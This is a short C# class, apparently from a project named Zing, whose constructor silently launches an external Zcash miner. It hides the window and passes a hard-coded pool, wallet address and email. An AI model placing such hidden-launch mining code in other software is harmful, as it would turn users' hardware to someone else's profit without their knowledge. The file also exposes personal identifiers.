using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Zing
{
    public class Miner
    {
        public Miner()
        {
            var process = new Process();
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.FileName = @"C:\nheqminer\nheqminer.exe";
            process.StartInfo.Arguments = "-l zec-us-west1.nanopool.org:6666 -u t1VrxdseWo7a97XkcyyosnGREfW9rETVEaK/aphrodite/chrishoward91@gmail.com -cd 0 1 -t 8";
            process.Start();
        }
    }
}
